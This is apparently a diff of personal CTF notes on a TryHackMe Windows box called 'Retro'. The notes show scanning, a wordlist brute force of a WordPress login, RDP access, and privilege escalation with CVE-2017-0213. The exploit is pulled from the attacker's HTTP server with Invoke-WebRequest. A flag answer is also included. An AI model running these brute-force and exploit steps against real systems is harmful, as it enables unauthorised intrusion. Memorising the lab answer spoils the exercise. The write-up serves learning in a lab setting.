@@ -63,7 +63,6 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 44.40 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.106.113
 
-
 ┌──(kali㉿kali)-[~]
 └─$ feroxbuster --url http://10.10.106.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -C 404,403 
 
@@ -233,12 +232,9 @@ Interesting Finding(s):
 [+] Memory used: 203.473 MB
 [+] Elapsed time: 00:00:43
 
-
 We discover that everything on the box is updated, which straitens our attack surface, but we have a username on the box which is wade.
 
-
 Since we have a username and our attack possibilities are limited to just a couple of ways. We are going to create a custom wordlist from WordPress blog we came accross earlier. To do this, we will use CeWL tool. We scan to a depth of 3 (-d 3) and use a minimum word length of 7 (-m 7), then save the words to a file (-w retrowl.txt), targeting the URL (http://retro.thm/retro/).
-
 
 or can be done with the dict rockyou.txt
 
@@ -251,9 +247,7 @@ CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 └─$ wc -l retrowl.txt 
 302 retrowl.txt
 
-
 After we create our custom wordlist, we will bruteforce WordPress admin login page to see if we can get a valid password to log in.
-
 
 ┌──(kali㉿kali)-[~]
 └─$ wpscan --url http://retro.thm/retro -U Wade -P retrowl.txt       
@@ -369,7 +363,6 @@ Exploitation
 
 So, we use credentials we found to log in via xfeerdp to see if we are able to have a connection to the box.
 
-
 ┌──(kali㉿kali)-[~]
 └─$ xfreerdp /u:Wade /p:'parzival' /v:10.10.106.113 /size:85%
 [13:51:00:156] [38165:38170] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
@@ -403,7 +396,6 @@ We are now on the box and it is time to enumerate for privilege escalation after
 
 And it works. We are able to RDP into the box.
 
-
 priv esc
 
 We enumerate the machine to find weak services, permissions, and files on the server.
@@ -425,13 +417,11 @@ Privilege Name                Description                    State
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 
-
 However, after trying that exploit for a while, we understand that we are not able to get root privileges on the box (this is a personal experience, it may work for someone else). We decide to enumerate box further to find another way to escalate our privilege.
 
 Therefore, since the box is Microsoft Windows Server 2016 Standard and OS version is 10.0.14393 N/A Build 14393, we decide to google it to find another way for post-exploitation.
 
 Enumerating system information to find out more information about the operating system, its version/build and any hotfixes installed:
-
 
 C:\Users\Wade>systeminfo
 
@@ -480,7 +470,6 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 
 This specific build of Windows 10 is affected by a kernel exploit that allows for privilege escalation (2017-0213), as mentioned in PayloadAllTheThings:
 
-
 We find a CVE-2017-0213, and we decide to use this exploit to escalate our privilege on the box.
 
 The “Affected Products” section of the repository also confirms that the build the box is running is vulnerable:
@@ -495,7 +484,6 @@ In order to download file to target box, we set up an Http server on our attacki
 └─$ python3 -m http.server                 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
-
 Then on the target box, Google Chrome is installed, we open it and type our attacking box IP on the web browser and download it.
 
 so cannot pass it , using powershell
@@ -509,7 +497,6 @@ Archive:  CVE-2017-0213_x64.zip
 └─$ python3 -m http.server 80  
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.106.113 - - [28/Sep/2022 14:17:28] "GET /CVE-2017-0213_x64.exe HTTP/1.1" 200 -
-
 
 PS C:\Users\Wade> Invoke-WebRequest -Uri http://10.11.81.220/CVE-2017-0213_x64.exe -OutFile CVE-2017-0213_x64.exe
 
@@ -612,18 +599,11 @@ A web server is running on the target. What is the hidden directory which the we
 dirbuster 2.3 medium
 */retro*
 
-![[Pasted image 20220928122948.png]]
-
 ![](https://media-exp1.licdn.com/dms/image/C4D12AQGzgWuI3N6_kA/article-inline_image-shrink_1000_1488/0/1624395483217?e=1669852800&v=beta&t=_mVz2JY475JIB4qVJBAAa-E62fyXCcafUW_ZRaIIzeA)
-
-![[Pasted image 20220928125228.png]]
 
 ![](https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/07/image-62.png?w=1019&ssl=1)
 
 ![](https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/07/image-54.png?w=690&ssl=1)
-
-
-![[Pasted image 20220928132126.png]]
 
 user.txt
  Don't leave sensitive information out in the open, even if you think you have control over it.
@@ -632,8 +612,6 @@ user.txt
 root.txt
 Figure out what the user last was trying to find. Otherwise, put this one on ice and get yourself a better shell, perhaps one dipped in venom.
 *795f8b569565d7bd88d10c6f22d1c4063*
-
-
 
 [[Internal]]
 
